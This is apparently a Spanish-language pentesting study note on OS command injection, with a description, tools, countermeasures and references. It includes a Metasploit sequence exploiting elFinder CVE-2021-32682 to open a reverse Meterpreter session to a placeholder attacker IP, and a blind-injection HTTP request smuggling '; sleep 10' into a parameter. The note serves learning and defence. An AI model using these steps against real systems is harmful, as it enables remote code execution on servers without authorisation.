---
title: Análisis de Command Injection
slug: analisis-command-injection
aliases: [Análisis de Command Injection]
fase: [Análisis de Vulnerabilidades]
plataforma: Web
dificultad: Intermedia
mitre: [T1190]
related: []
learning_refs: [portswigger/os-command-injection-simple-case]
---

# Análisis de Command Injection

## Descripción
La inyección de comandos ocurre cuando una aplicación web pasa datos no sanitizados del usuario (como parámetros de formularios, cookies o cabeceras HTTP) directamente a una shell del sistema operativo. Esto permite al atacante ejecutar comandos arbitrarios con los privilegios de la cuenta que ejecuta el servidor web, comprometiendo la integridad del sistema.

## Herramientas
- **Metasploit** (`exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection`) — módulo específico para explotar vulnerabilidades en conectores elFinder.
- **Burp Suite** — para identificar parámetros reflejados en funciones que invocan procesos del sistema.

## Comandos / Ejemplos

### Explotación de elFinder (CVE-2021-32682)
```bash
# Uso del módulo en Metasploit para obtener una shell
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
set RHOSTS files.lookup.thm
set TARGETURI /elFinder/
set LHOST <IP_ATACANTE>
run
# Resultado: Sesión de Meterpreter abierta
```

### Prueba manual (Ciego)
```http
# Inyección usando operadores de control (; && ||)
POST /api/checkStatus HTTP/1.1
Host: target.com
data=123; sleep 10
# Si la respuesta tarda 10 segundos, es vulnerable.
```

## Contramedidas
- Evitar el uso de funciones que invocan la shell (ej. `exec`, `system`, `passthru` en PHP).
- Usar APIs integradas que no dependan de la shell para tareas comunes (manejo de archivos, red).
- Implementar validación estricta (listas blancas) y escapado de caracteres especiales.

## Referencias
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking* (5th ed.). McGraw-Hill Education.
- MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
